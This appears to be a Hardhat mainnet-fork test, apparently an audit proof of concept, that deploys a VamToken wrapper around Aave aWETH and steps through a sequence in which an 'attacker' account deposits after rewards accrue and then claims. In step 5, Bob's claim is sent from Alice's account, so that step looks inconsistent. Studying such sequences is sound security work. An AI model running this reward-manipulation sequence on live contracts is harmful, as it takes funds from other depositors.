import rawDRE from 'hardhat';
import BigNumber from 'bignumber.js';
import {
  LendingPoolFactory,
  WETH9Factory,
  StaticATokenFactory,
  ATokenFactory,
  ERC20,
  LendingPool,
  VamToken,
  VamTokenFactory,
  AToken,
  WETH9,
  ERC20Factory,
} from '../../../types';
import {
  impersonateAccountsHardhat,
  DRE,
  waitForTx,
  advanceTimeAndBlock,
} from '../../../helpers/misc-utils';
import { utils } from 'ethers';
import { MAX_UINT_AMOUNT } from '../../../helpers/constants';
import { formatEther, parseEther } from 'ethers/lib/utils';

const { expect } = require('chai');

const DEFAULT_GAS_LIMIT = 10000000;
const DEFAULT_GAS_PRICE = utils.parseUnits('100', 'gwei');

const defaultTxParams = { gasLimit: DEFAULT_GAS_LIMIT, gasPrice: DEFAULT_GAS_PRICE };

const ETHER_BANK = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
const LENDING_POOL = '0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9';

const WETH = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';

const AWETH = '0x030bA81f1c18d280636F32af80b9AAd02Cf0854e';

const STKAAVE = '0x4da27a545c0c5B758a6BA100e3a049001de870f5';

const TEST_USERS = [
  '0x0F4ee9631f4be0a63756515141281A3E2B293Bbe',
  '0x9FC9C2DfBA3b6cF204C37a5F690619772b926e39',
];

before(async () => {
  await rawDRE.run('set-DRE');

  // Impersonations
  await impersonateAccountsHardhat([ETHER_BANK, ...TEST_USERS]);

  const ethHolderSigner = DRE.ethers.provider.getSigner(ETHER_BANK);
  for (const recipientOfEth of [...TEST_USERS]) {
    await ethHolderSigner.sendTransaction({
      from: ethHolderSigner._address,
      to: recipientOfEth,
      value: utils.parseEther('100'),
      ...defaultTxParams,
    });
  }

  console.log('\n***************');
  console.log('Test setup finished');
  console.log('***************\n');
});

describe('Attack', () => {
  let vamToken: VamToken;

  let lendingPool: LendingPool;

  let aweth: AToken;
  let weth: WETH9;

  let stkAave: ERC20;

  it('Deposit weth into lending pool to get aweth', async () => {
    const userSigner = DRE.ethers.provider.getSigner(TEST_USERS[0]);
    const attackerSigner = DRE.ethers.provider.getSigner(TEST_USERS[1]);

    console.log(attackerSigner._address);

    lendingPool = LendingPoolFactory.connect(LENDING_POOL, userSigner);

    weth = WETH9Factory.connect(WETH, userSigner);
    aweth = ATokenFactory.connect(AWETH, userSigner);
    stkAave = ERC20Factory.connect(STKAAVE, userSigner);

    console.log(`eth balance: ${formatEther(await userSigner.getBalance())}`);

    const amountToDeposit = utils.parseEther('100');

    await waitForTx(await weth.deposit({ value: amountToDeposit }));
    await waitForTx(await weth.connect(attackerSigner).deposit({ value: amountToDeposit }));

    await waitForTx(await weth.approve(lendingPool.address, amountToDeposit));
    await waitForTx(
      await weth.connect(attackerSigner).approve(lendingPool.address, amountToDeposit)
    );

    await waitForTx(
      await lendingPool.deposit(weth.address, amountToDeposit, userSigner._address, 0)
    );
    await waitForTx(
      await lendingPool
        .connect(attackerSigner)
        .deposit(weth.address, amountToDeposit, attackerSigner._address, 0)
    );

    console.log(`Aweth balance: ${formatEther(await aweth.balanceOf(userSigner._address))}`);
    console.log(`Aweth balance: ${formatEther(await aweth.balanceOf(attackerSigner._address))}`);
  });

  it('Deploy VamToken', async () => {
    const userSigner = DRE.ethers.provider.getSigner(TEST_USERS[0]);
    // Deploy the VamToken
    const VamToken = await DRE.ethers.getContractFactory('VamToken', userSigner);
    vamToken = (await VamToken.deploy(AWETH)) as VamToken;
  });

  it('Time to attack', async () => {
    const userSigner = DRE.ethers.provider.getSigner(TEST_USERS[0]);
    const attackerSigner = DRE.ethers.provider.getSigner(TEST_USERS[1]);

    const mintAmount = parseEther('50');

    console.log('Step 1. Alice Deposits');
    // Step 1, Alice deposits
    await waitForTx(await aweth.connect(userSigner).approve(vamToken.address, MAX_UINT_AMOUNT));
    await waitForTx(await vamToken.connect(userSigner).mint(mintAmount));

    console.log(
      `Alice balance in pool: ${formatEther(await vamToken.balanceOf(userSigner._address))}`
    );
    console.log(`Total supply vamToken: ${formatEther(await vamToken.totalSupply())}`);

    // Step 2 Time flies
    console.log('Step 2. We wait');
    const timeToAdvance = 60 * 60 * 24 * 30;
    await advanceTimeAndBlock(timeToAdvance);
    await waitForTx(await vamToken.claimRewardsFromController());
    console.log(
      `stkAave Rewards in vamToken: ${formatEther(await stkAave.balanceOf(vamToken.address))}`
    );

    // Step 3 Bob deposits
    console.log('Step 3. Bob Deposits');
    await waitForTx(await aweth.connect(attackerSigner).approve(vamToken.address, MAX_UINT_AMOUNT));
    await waitForTx(await vamToken.connect(attackerSigner).mint(mintAmount));
    console.log(
      `Bob balance in pool: ${formatEther(await vamToken.balanceOf(attackerSigner._address))}`
    );
    console.log(`Total supply vamToken: ${formatEther(await vamToken.totalSupply())}`);

    // Step 4, Alice withdraws and claims
    console.log('Step 4. Alice Withdraws and claim');
    const aliceBalance = await vamToken.balanceOf(userSigner._address);
    await waitForTx(await vamToken.connect(userSigner).burn(aliceBalance));

    console.log(`Alice aweth balance: ${formatEther(await aweth.balanceOf(userSigner._address))}`);

    await waitForTx(await vamToken.connect(userSigner).claimRewards(userSigner._address, STKAAVE));
    console.log(
      `Alice stkAave balance: ${formatEther(await stkAave.balanceOf(userSigner._address))}`
    );

    // Bob also withdraws
    console.log(`Step 5. Bob withdraws and claims`);
    const bobBalance = await vamToken.balanceOf(attackerSigner._address);
    await waitForTx(await vamToken.connect(attackerSigner).burn(bobBalance));
    await waitForTx(await vamToken.connect(userSigner).claimRewards(userSigner._address, STKAAVE));
    console.log(
      `Bob aweth balance: ${formatEther(await aweth.balanceOf(attackerSigner._address))}`
    );
    console.log(
      `Bob stkAave balance: ${formatEther(await stkAave.balanceOf(attackerSigner._address))}`
    );

    console.log(
      `Total vamToken supply: ${formatEther(
        await vamToken.totalSupply()
      )}. aweth in vamToken: ${formatEther(
        await aweth.balanceOf(vamToken.address)
      )}. stkAave in vamToken: ${formatEther(await stkAave.balanceOf(vamToken.address))}`
    );
  });
});
